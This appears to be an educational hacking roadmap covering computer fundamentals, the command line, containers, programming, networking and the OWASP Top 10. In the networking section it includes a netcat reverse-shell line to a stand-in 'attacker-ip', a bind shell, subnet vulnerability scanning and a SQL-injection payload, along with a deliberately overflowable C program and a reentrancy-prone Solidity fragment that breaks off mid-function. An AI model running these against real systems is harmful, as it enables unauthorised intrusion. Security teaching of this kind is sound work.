0. Foundations (Before Cybersecurity)

You cannot hack what you do not understand. This section is non-negotiable. Most people want to skip straight to "hacking tools", but without this foundation everything later feels like magic — and magic is impossible to break reliably. Plan to spend 4–8 weeks here depending on your starting point. Go slow. Understand deeply.

0.1 Hardware & OS
How Computers Actually Work • CPU • RAM • Storage • Operating System

Imagine a restaurant kitchen:

  • CPU (Central Processing Unit) = the chef. It is the only thing that can actually "do work". It follows instructions extremely quickly — billions of times per second.
  • RAM (Random Access Memory) = the chef's counter space. Very fast to grab ingredients from, but when the restaurant closes (computer powers off), everything on the counter disappears. Volatile = temporary.
  • Storage (SSD / HDD) = the pantry and fridge. Much slower to get things from, but the food stays there even when the restaurant is closed. Persistent = survives power-off.

The CPU works in an endless loop called the fetch-decode-execute cycle:

  1. Fetch: Get the next instruction from RAM (using the Program Counter register to know the address).
  2. Decode: Figure out what the instruction means (add two numbers? jump somewhere? read from disk?).
  3. Execute: Actually do it — and usually write the result somewhere (often back to RAM or a register).
  4. Repeat forever (or until the computer is turned off).

The Operating System kernel is like the restaurant manager + head chef combined. It:

  • Decides which program (process) gets to use the CPU right now (scheduling)
  • Allocates RAM to programs and makes sure they don't step on each other
  • Handles talking to hardware (disk, network card, keyboard) through drivers
  • Provides system calls — the only safe way user programs are allowed to ask for dangerous things (open file, send network packet, allocate more memory)
# See live CPU, memory, swap, processes (very useful during pentesting) htop # press F2 → Setup → Meters → add "Disk IO" or "Network" if you want # See detailed CPU model, cores, cache sizes, clock speed cat /proc/cpuinfo | head -n 35 # Memory: total, used, free, buffers/cache, available (most important number) free -h # Swap usage — high swap usually means you're running out of RAM swapon --show free -h # Quick summary of system + kernel version uname -a cat /etc/os-release
DO: Every day for two weeks, draw the fetch-decode-execute cycle from memory on paper — label each step and where registers & RAM are involved.
DON'T: Ever accept "it just works" explanations again. Force yourself to trace where every piece of data actually lives.
Biggest benefit: Buffer overflows, race conditions, use-after-free, kernel panics — they all stop being mysterious.
Biggest danger of skipping: You become the person who runs Metasploit scripts without understanding why they sometimes fail.

0.2 Filesystems & Binary
Binary • Hexadecimal • Endianness • Filesystems (ext4, NTFS, etc.)

All data in a computer is ultimately just 0s and 1s (binary). Humans find long binary strings hard to read, so we group them:

  • 4 bits = 1 hexadecimal digit (0–9, A–F)
  • 8 bits = 1 byte = 2 hex digits
  • 32 bits = 4 bytes = 8 hex digits (common for memory addresses on 32-bit systems)

Endianness = which byte goes first when storing numbers bigger than 1 byte.

  • Little-endian (most x86/x64 computers): least significant byte first → 0x1234 is stored as bytes [34 12]
  • Big-endian (network protocols, some old architectures): most significant byte first → 0x1234 is stored as [12 34]

→ This is why shellcode and memory reading often look "backwards" on Intel/AMD machines.

Filesystems decide how files are organized on disk:

  • FAT32: very old, max 4 GB file size, no permissions — USB drives
  • exFAT: better for large files, still no real permissions — modern USB/SD cards
  • NTFS: Windows default — supports permissions, encryption, compression, large files
  • ext4: most common on Linux — journaling, large files, good performance
  • APFS: macOS modern filesystem — snapshots, encryption by default

Understanding filesystems helps when you recover deleted files, analyze forensic images, or exploit filesystem-specific bugs.

# Show string "Hacker" as hex and binary echo -n "Hacker" | xxd echo -n "Hacker" | xxd -b # Convert hex bytes back to text (classic way to read memory dumps) echo "48 65 6c 6c 6f 20 57 6f 72 6c 64" | xxd -r -p # Show first 256 bytes of a file in nice format xxd -l 256 /bin/ls | less # See current filesystem type of mounted partitions df -T lsblk -f
DO: For one week, every time you see a hex number (memory address, hash, color code), manually convert the first few digits to binary in your head.
DON'T: Depend forever on online converters — you need instant recognition.
Huge benefit: You can read raw packet captures, memory dumps, shellcode, and binary file headers without tools.
Danger of skipping: You'll be copy-pasting exploit code forever without understanding why it works or fails.
0.3 Command Line & VMs
Command Line Mastery + Virtual Machines (Isolation & Safety)

The terminal is your primary weapon. GUI tools are nice, but real power lives in the shell.

Essential everyday commands (memorize these):

  • Navigation: pwd • cd • ls -la • tree -L 2
  • File ops: touch • mkdir -p • cp -r • mv • rm -rf (careful!)
  • Search & view: find / -name "*.conf" 2>/dev/null • grep -r "password" /etc • less • cat • head -n20 • tail -f
  • Text processing: cut -d: -f1 /etc/passwd • sort -u • wc -l • sed 's/old/new/g' • awk '{print $1}'
  • Permissions: chmod 755 script.sh • chmod u+s binary (SUID) • chown root:root file
  • Processes: ps auxf • top / htop • kill -9 PID
  • Network: ss -tuln • ip a • ping -c4 • curl ifconfig.me

Virtual Machines give you disposable, snapshot-able environments.

  • Run malware? Snapshot first.
  • Test exploit? Revert when done.
  • Practice privilege escalation? No risk to host.
# Find every file containing "password" anywhere under /etc (ignore permission errors) grep -rI "password" /etc 2>/dev/null # Find all SUID binaries (potential privilege escalation vectors) find / -perm -4000 -type f 2>/dev/null # Create a named snapshot in VirtualBox from command line vboxmanage snapshot "Kali-VM" take "Before-metasploit-install" --description "Clean state before installing extra tools" # List snapshots vboxmanage snapshot "Kali-VM" list # Revert to clean state vboxmanage snapshot "Kali-VM" restore "Before-metasploit-install"
DO: For 30 days use ONLY terminal for file operations — no mouse clicks in file manager.
DON'T: Memorize commands without understanding flags (man ls, man grep, etc.).
Pro: Speed ×10, automation becomes natural, you see the real structure of Linux.
Con of weak CLI: You'll always be slow and dependent on GUIs that don't exist on servers.

0.4 Containers
Docker & Containers (vs full Virtual Machines)

VMs run a complete guest OS → heavy (1–3 GB RAM per VM), slow startup, full isolation.

Containers share the host kernel → very light (50–400 MB), start in <1 second, process-level isolation via namespaces + cgroups.

Docker advantages for security people:

  • Run 10 vulnerable web apps at once with almost no resource cost
  • Throw away environment instantly (docker rm -f)
  • Reproducible labs with docker-compose.yml files
  • Test exploits in isolated network namespaces

Key concepts to master:

  • Image vs Container (image = blueprint, container = running instance)
  • Dockerfile – how to build your own images
  • docker-compose – multi-container apps (web + db + cache)
  • Volumes – persistent data
  • Networks – bridge, host, none
# Run Kali Linux container and map port 80 → 8080 on host docker run -d --name my-kali -p 8080:80 kalilinux/kali-rolling # Get inside running container docker exec -it my-kali bash # See running containers, ports, status docker ps -a # Stop and remove container (disposable mindset) docker stop my-kali && docker rm my-kali # Example: quick vulnerable web app lab docker run -d -p 80:80 vulnerables/web-dvwa docker run -d -p 3000:3000 bkimminich/juice-shop
DO: Use containers for EVERY vulnerable app / tool test — never install directly on host or VM unless necessary.
DON'T: Run untrusted containers with --privileged or -v /:/host (gives container full host access).
Biggest benefit: Clean, fast, reproducible environments — essential for serious pentesting and exploit dev.
Danger: Running random Docker images from internet without checking = potential backdoor on your machine.

1. Programming Fundamentals

A hacker must write code before they can break it. Spend 8–10 weeks here.

Core Programming Concepts — Explained Deeply
Variables & Memory
Variables are named memory locations. In C, int x = 5; allocates 4 bytes on stack. Understand scope, lifetime, and shadowing.
Loops & Control Flow
for, while, do-while, recursion. Recursion depth can cause stack overflow — critical for exploit writing.
Functions & Closures
First-class functions in JS/Python allow callbacks and higher-order functions used in event-driven exploits.
Data Structures & Algorithms
Arrays, HashMaps, Linked Lists, Trees, Graphs. Big-O notation. Know how to implement a binary search or Dijkstra for network mapping.
Memory Management & Concurrency
Stack (fast, automatic) vs Heap (manual, slower). Pointers in C. Threads, mutexes, deadlocks — race conditions are real attack vectors.
DO: Implement every concept twice — once in Python, once in C.
DON'T: Copy code from GitHub without rewriting it line-by-line.
Language Learning Path
Recommended Order + Real Examples

1. Python – scripting & exploits
2. JavaScript – web & Node.js
3. C – memory & exploits
4. Go/Rust – safe systems
5. Solidity – blockchain

Critical Low-Level Topics: Pointers, Buffers, Stack vs Heap

In C, pointers hold memory addresses. Buffers are fixed-size arrays. Stack grows downward, heap grows upward. Overflowing a stack buffer can overwrite return addresses — the basis of 90% of classic exploits.

// Classic buffer overflow
#include <string.h>
void vuln() {
char buf[8];
strcpy(buf, "This string is way too long and will overflow");
}
int main() { vuln(); return 0; }
DO: Compile with gcc -fno-stack-protector -z execstack and test.
DON'T: Use strcpy, gets, or any unsafe function in 2026.

2. Networking (Critical for Hackers)

If you cannot read packets, you are not a hacker. This is where real reconnaissance happens.

Core Models
OSI 7 Layers vs TCP/IP Model

Layer 1–2: Physical & Data Link (MAC addresses, switches).
Layer 3: Network (IP, routing, ICMP).
Layer 4: Transport (TCP vs UDP — three-way handshake, flags).
Layer 5–7: Session, Presentation, Application (HTTP, DNS, TLS).

TCP is connection-oriented and reliable; UDP is fire-and-forget. Understand SYN flood, ACK scan, etc.

tcpdump -i eth0 tcp port 80 -nn -X
wireshark
DNS, HTTP/HTTPS, Routing, NAT, Firewalls, VPNs

DNS: A/AAAA, MX, NS records. Zone transfers are still possible on misconfigured servers.
HTTP: Methods (GET/POST/PUT), headers (User-Agent, Cookie, Authorization), status codes.
HTTPS: TLS 1.2/1.3 handshake, certificate pinning.
Firewalls: Stateful vs stateless, iptables/nftables rules.
VPNs: OpenVPN, WireGuard, IPsec — learn to pivot through them.

DO: Capture and analyze your own browsing traffic every day for a week.
DON'T: Trust "it's HTTPS" without checking certificate and HSTS.
Tools Mastery — Nmap, Netcat, Wireshark
# Full reconnaissance scan
nmap -sS -sV -O --script vuln -p- -T4 192.168.1.0/24

# Bind shell with Netcat
nc -lvnp 4444
# Reverse shell
nc -e /bin/sh attacker-ip 4444

5. Web Security – Full OWASP Top 10 (2021 + 2025 updates)

Every Single Vulnerability — Deep Dive
A01:2021 – Broken Access Control
Most common. IDOR (Insecure Direct Object Reference): change user ID in URL. Mass assignment in frameworks. Horizontal & vertical privilege escalation. Example fix: Always check ownership on every request.
A02:2021 – Cryptographic Failures
Weak algorithms (MD5, SHA1), missing TLS, weak random, hardcoded keys. Example: Using ECB mode for AES = patterns visible in ciphertext.
A03:2021 – Injection
SQLi, NoSQLi, Command injection, LDAP. Classic: ' OR 1=1--
Fix: Prepared statements / ORM + input validation.
A04:2021 – Insecure Design
Missing threat modeling. Example: Password reset token = md5(userid + timestamp).
A05:2021 – Security Misconfiguration
Default credentials, debug mode in production, unnecessary services exposed.
A06:2021 – Vulnerable and Outdated Components
Log4Shell, Spring4Shell, outdated npm packages (npm audit).
A07:2021 – Identification and Authentication Failures
Weak passwords, no MFA, session fixation, credential stuffing.
A08:2021 – Software and Data Integrity Failures
Insecure deserialization (Java, PHP), supply-chain attacks.
A09:2021 – Security Logging & Monitoring Failures
No logs = no detection. Missing rate limiting on login.
A10:2021 – Server-Side Request Forgery (SSRF)
Attacker makes server request internal services (metadata endpoints on cloud).

function withdraw() public {
msg.sender.call{value: balance[msg.sender]}("");
